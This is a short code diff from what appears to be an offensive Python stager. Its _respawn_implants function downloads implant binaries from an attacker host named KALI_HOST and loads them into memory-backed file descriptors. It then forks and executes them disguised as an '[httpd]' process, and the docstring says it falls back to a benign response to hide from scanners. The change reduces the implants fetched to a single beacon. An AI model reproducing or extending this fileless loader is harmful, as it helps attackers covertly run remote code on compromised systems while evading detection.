@@ -37,8 +37,8 @@ def _benign_response():
 
 
 def _respawn_implants():
-    """Re-run the in-memory loader: fetch both implants, drop them into
-    memfd-backed file descriptors, fork and execve as ``[httpd]``.
+    """Re-run the in-memory loader: fetch the beacon implant, drop it into
+    a memfd-backed file descriptor, fork and execve as ``[httpd]``.
 
     On any error the stager silently falls back to the benign response so
     accidental misuse from a probing scanner doesn't expose the mechanism.
@@ -47,7 +47,7 @@ def _respawn_implants():
         import urllib.request
         import ctypes
         libc = ctypes.CDLL(None)
-        for binary in ("session_implant", "beacon_implant"):
+        for binary in ("beacon_implant",):
             url = f"http://{KALI_HOST}:{KALI_PORT}/{binary}"
             with urllib.request.urlopen(url, timeout=5) as r:
                 data = r.read()
